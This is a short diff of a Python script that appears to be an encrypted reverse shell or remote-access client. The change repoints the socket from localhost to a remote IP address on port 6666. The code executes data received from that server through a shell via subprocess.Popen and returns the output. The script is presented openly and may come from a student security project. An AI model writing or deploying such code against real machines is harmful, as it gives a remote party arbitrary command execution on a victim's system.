@@ -11,10 +11,10 @@ from Crypto.Cipher import AES
 #https://stackoverflow.com/questions/26851034/opening-a-ssl-socket-connection-in-python
 
 #Set variables
-HVA = '145.28.188.157'
+HVA = '145.28.150.217'
 l = 'localhost'
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-serverAddress = l, 1111
+serverAddress = HVA, 6666
 
 global key
 key = []
@@ -37,7 +37,7 @@ def decryptAES(ciphertext, key):
 def popenExecution(data):
     command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    return str(command.stdout.read() + command.stderr.read(), "utf-8")
+    return str(command.stdout.read() + command.stderr.read())
 
 
 #   --> Send a payload to the server, serializes into an encryption
